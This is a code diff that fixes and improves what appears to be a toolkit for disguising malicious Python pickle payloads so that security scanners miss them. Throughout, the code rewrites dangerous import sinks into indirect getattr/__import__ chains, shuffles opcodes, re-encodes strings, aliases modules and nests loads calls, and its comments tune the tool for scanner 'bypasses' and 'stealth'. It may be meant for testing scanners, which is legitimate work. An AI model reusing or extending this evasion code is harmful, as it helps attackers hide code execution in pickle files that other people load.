@@ -49,6 +49,25 @@ def _args_tuple_bytes(args: tuple) -> bytes:
     return pickle.dumps(args, protocol=2)[2:-1]
 
 
+def leaf_import_chain(module: str, name: str) -> list[bytes]:
+    """Opcode sequence: ``getattr(__import__(module, None, None, [name]), name)``.
+
+    ``__import__(dotted)`` without ``fromlist`` returns the top-level package
+    (``IPython``, ``numpy``), so ``getattr(..., name)`` fails on dotted sinks.
+    A non-empty fromlist makes ``__import__`` return the leaf module.
+    """
+    return [
+        OPCODES_BY_NAME["GLOBAL"].code + b"builtins\ngetattr\n",
+        OPCODES_BY_NAME["MARK"].code,
+        OPCODES_BY_NAME["GLOBAL"].code + b"builtins\n__import__\n",
+        _args_tuple_bytes((module, None, None, [name])),
+        OPCODES_BY_NAME["REDUCE"].code,
+        _enc_short_binunicode(name),
+        OPCODES_BY_NAME["TUPLE"].code,
+        OPCODES_BY_NAME["REDUCE"].code,
+    ]
+
+
 def _ensure_proto(stream: bytes, min_proto: int = 4) -> bytes:
     """Bump the PROTO header to >= min_proto (length-preserving version swap).
 
@@ -250,13 +269,15 @@ class IndirectChain(EvasionStrategy):
     Replaces every ``GLOBAL <module> <sink>`` with a *balanced* runtime chain::
 
         GLOBAL builtins.getattr
-        MARK  GLOBAL builtins.__import__  ('module',) REDUCE   -> module
-              SHORT_BINUNICODE 'sink'                            -> name
-        TUPLE                                                   -> (module, name)
+        MARK  GLOBAL builtins.__import__  (module, None, None, [name]) REDUCE
+              SHORT_BINUNICODE 'sink'
+        TUPLE
         REDUCE                                                  -> bound sink
 
-    followed by the untouched args tuple. No GLOBAL operand names the
-    dangerous pair, and the nested import is consumed inside the getattr
+    followed by the untouched args tuple. ``fromlist=[name]`` is required so
+    dotted modules (``IPython.utils.process``, ``numpy.testing._private.utils``)
+    resolve to the leaf, not the top-level package. No GLOBAL operand names
+    the dangerous pair, and the nested import is consumed inside the getattr
     argument region, so the stack stays balanced across multiple rewritten
     call sites in one stream.
     """
@@ -277,18 +298,10 @@ class IndirectChain(EvasionStrategy):
                 if len(fields) >= 2:
                     module = _canonical_module(fields[0])
                     fname = fields[1]
-                    parts += [
-                        OPCODES_BY_NAME["GLOBAL"].code,
-                        b"builtins\ngetattr\n",
-                        OPCODES_BY_NAME["MARK"].code,
-                        OPCODES_BY_NAME["GLOBAL"].code,
-                        b"builtins\n__import__\n",
-                        _args_tuple_bytes((module,)),
-                        OPCODES_BY_NAME["REDUCE"].code,
-                        _enc_short_binunicode(fname),
-                        OPCODES_BY_NAME["TUPLE"].code,
-                        OPCODES_BY_NAME["REDUCE"].code,
-                    ]
+                    if module == "builtins" and fname in ("getattr", "__import__"):
+                        parts.append(op.code + arg)
+                        continue
+                    parts += leaf_import_chain(module, fname)
                     changed = True
                     continue
             parts.append(op.code + arg)
@@ -332,12 +345,15 @@ class OpcodeReordering(EvasionStrategy):
                         except Exception:
                             pass
                     i += 1
-                # If we have multiple independent operations, shuffle them
+                block = [parsed[j][0].code + parsed[j][1]
+                         for j in range(block_start, i)]
+                # Only shuffle when the block holds multiple independent
+                # operations; otherwise emit verbatim. Falling through here
+                # would double-emit the first op and skip its successor.
                 if i - block_start > 1 and len(block_memos) > 1:
-                    block = [parsed[j][0].code + parsed[j][1] for j in range(block_start, i)]
                     random.shuffle(block)
-                    parts.extend(block)
-                    continue
+                parts.extend(block)
+                continue
             parts.append(op.code + arg)
             i += 1
 
@@ -416,7 +432,9 @@ class StringEncodingVariants(EvasionStrategy):
                 except Exception:
                     parts.append(op.code + arg)
                     continue
-                # Randomly choose different encoding
+                # Randomly choose different encoding. UNICODE (V) is a
+                # raw newline-terminated string, NOT quote-wrapped (the quote
+                # form is STRING/S); wrapping it changes the value.
                 choice = random.choice(["short", "bin", "unicode"])
                 if choice == "short" and len(s.encode("utf-8")) <= 255:
                     parts.append(_enc_short_binunicode(s))
@@ -424,7 +442,7 @@ class StringEncodingVariants(EvasionStrategy):
                     encoded = s.encode("utf-8")
                     parts.append(OPCODES_BY_NAME["BINUNICODE"].code + struct.pack("<I", len(encoded)) + encoded)
                 else:
-                    parts.append(OPCODES_BY_NAME["UNICODE"].code + f"'{s}'\n".encode("utf-8"))
+                    parts.append(OPCODES_BY_NAME["UNICODE"].code + f"{s}\n".encode("utf-8"))
             else:
                 parts.append(op.code + arg)
         return _ensure_proto(b"".join(parts))
@@ -500,7 +518,9 @@ class ModuleAliasing(EvasionStrategy):
                     module = _canonical_module(fields[0])
                     fname = fields[1]
                     # Use alternative module paths for common dangerous modules
-                    # Only use aliases that actually exist on this platform
+                    # Only use aliases that actually exist on this platform.
+                    # __builtin__ is the py2 name and must never be emitted on
+                    # py3: STACK_GLOBAL resolves the module literally.
                     import sys
                     aliases = {
                         "os": ["os"],
@@ -511,7 +531,6 @@ class ModuleAliasing(EvasionStrategy):
                         aliases["os"].append("nt")
                     else:
                         aliases["os"].append("posix")
-                    aliases["builtins"].append("__builtin__")
                     if module in aliases and len(aliases[module]) > 1:
                         module = random.choice(aliases[module])
                     parts.append(_enc_short_binunicode(module))
@@ -556,6 +575,8 @@ class NestedLoadObfuscation(EvasionStrategy):
 
                 if payload.startswith(b"\x80") or payload.startswith(b"c") or payload.startswith(b"("):
                     # Double-wrap: loads(BINBYTES(loads(BINBYTES(inner))))
+                    # The wrapped blob must be a complete, loadable pickle
+                    # (trailing STOP) or the outer loads() runs out of input.
                     try:
                         inner = pickle.loads(payload + OPCODES_BY_NAME["STOP"].code)
                         # Re-pickle the inner object
@@ -566,6 +587,7 @@ class NestedLoadObfuscation(EvasionStrategy):
                             b"_pickle\nloads\n",
                             _binbytes_tuple(inner_pkl),
                             OPCODES_BY_NAME["REDUCE"].code,
+                            OPCODES_BY_NAME["STOP"].code,
                         ])
                         # Now encode this wrapped version
                         if op.name == "SHORT_BINBYTES":
@@ -641,10 +663,15 @@ def apply_pipeline(pkl_bytes: bytes, names: list[str]) -> bytes:
 
 def select_strategies(rng, k: int | None = None,
                       exclude_nested: bool = True) -> list[str]:
-    """Random subset of strategy names for exploration campaigns."""
+    """Random subset of strategy names for exploration campaigns.
+
+    Default ``k`` is capped at 1: stacking multiple strategies empirically
+    kills evasion (see fitness ablation: every combo with >1 strategy yields
+    0 bypasses). A single well-chosen strategy preserves the sink's stealth.
+    """
     pool = [n for n in STRATEGIES
             if not (exclude_nested and n in ("nested_loads_wrap", "nested_load_obfuscation"))]
     rng.shuffle(pool)
     if k is None:
-        k = rng.randint(0, len(pool))
+        k = rng.randint(0, 1)
     return pool[:k]
